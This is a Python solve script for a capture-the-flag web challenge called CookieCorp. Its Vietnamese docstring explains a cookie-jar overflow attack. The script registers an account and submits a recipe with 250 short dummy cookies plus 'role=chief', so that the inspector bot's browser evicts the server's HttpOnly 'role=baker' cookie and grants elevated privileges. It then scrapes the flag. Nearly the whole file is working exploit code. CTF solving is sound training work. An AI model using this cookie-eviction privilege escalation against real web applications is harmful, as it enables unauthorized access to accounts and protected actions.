#!/usr/bin/env python3
"""Payload ăn cờ CookieCorp: tràn cookie jar của bot inspector bằng cookie NGẮN.

   python solve_overflow.py            # dùng tài khoản mới, mặc định 250 dummy + role=chief

mixer.js set mỗi ingredient thành một cookie rồi mới POST /api/seal, nên stamp của bot
mang đúng jar mình điều khiển. Chromium giới hạn ~180 cookie mỗi domain và evict cookie cũ
nhất khi tràn, kể cả cookie HttpOnly `role=baker` mà server set lúc login. 250 ingredient
ngắn đẩy cookie đó ra, rồi `role=chief` ở vị trí cuối trở thành cookie role duy nhất mà
/api/seal nhìn thấy. Ingredient phải ngắn: nếu tối đa độ dài thì chạm ngưỡng byte của
header trước khi chạm ngưỡng số lượng, và phép thử đó không bao giờ kích hoạt eviction.

Code gốc lấy nguyên văn từ writeup của người dùng (Downloads/writeup-cookiecorp.md).
"""
import time

import requests

BASE = "https://tomorrow.web.2026.sunshinectf.games"
s = requests.Session()

# Register & login
s.post(f"{BASE}/register", json={"username": "solver_xyz", "password": "pass123"})

# Build 250 dummy ingredients + role=chief at the end
ingredients = [{"name": f"x{i:04d}", "value": f"v{i}"} for i in range(250)]
ingredients.append({"name": "role", "value": "chief"})

# Save recipe
r = s.post(f"{BASE}/api/recipe", json={
    "title": "Cookie Overflow",
    "ingredients": ingredients
})
recipe_id = r.json()["id"]
print(f"Recipe: {recipe_id}")

# Submit for bot review
s.post(f"{BASE}/api/recipe/{recipe_id}/submit")
print("Submitted, waiting for bot...")

# Wait for inspector bot to process
time.sleep(15)

# Check result
r = s.get(f"{BASE}/recipe/{recipe_id}")
if "sun{" in r.text:
    idx = r.text.index("sun{")
    end = r.text.index("}", idx)
    print(f"FLAG: {r.text[idx:end+1]}")
else:
    print("No flag yet, try refreshing")
